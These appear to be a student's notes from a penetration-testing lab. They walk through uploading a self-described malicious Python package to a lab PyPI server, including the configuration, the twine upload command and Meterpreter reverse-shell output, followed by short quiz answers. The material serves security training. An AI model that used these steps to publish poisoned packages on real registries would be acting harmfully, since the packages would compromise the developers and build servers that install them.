# Publishing Our Malicious Package

Configuring ~/.pypirc File to Add Server URL and Login Credentials
>``` shell
>kali@kali:~/hackshort-util$ nano ~/.pypirc
>
>kali@kali:~/hackshort-util$ cat ~/.pypirc
>
># ========== Expected Result ==========
>[distutils]
>index-servers = 
>    offseclab 
>
>[offseclab]
>repository: http://pypi.offseclab.io/
>username: student
>password: password  
># =====================================
>```

Uploading Our Malicious Pacakge to offseclab Repository
>``` shell
>kali@kali:~/hackshort-util$ twine upload --repository-url http://pypi.offseclab.io/ -u student -p password dist/*       
>
># ========== Expected Result ==========
>Uploading distributions to http://pypi.offseclab.io/
>Uploading hackshort_util-1.1.4.tar.gz
>100% ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.1/2.1 kB • 00:00 • ?
># =====================================
>```

Obtaining a Reverse Shell After Publishing Our Malicious Package to pypi.offseclab.io PyPI Server
>``` shell
>msf6 exploit(multi/handler) >
>[*] Sending stage (24772 bytes) to 44.211.221.172
>[*] Meterpreter session 2 opened (10.0.1.54:4488 -> 44.211.221.172:37604)
>```

Lab 1 - Once you obtain a shell on the production server, obtain the flag located in /proof.txt.
>``` shell
>
>```
>

Lab 2 - Obtain command execution on the builder server and read the file located in /proof.txt to obtain the flag. Do this by editing the setup.py file.
>``` shell
>
>```
>

Lab 3 - What evidence suggested that the shell was running inside a Docker container?
>B) The output of the mount command

Lab 4 - Which of the following was NOT identified as a secret in the environment variables?
>C) ROOT_PASSWORD
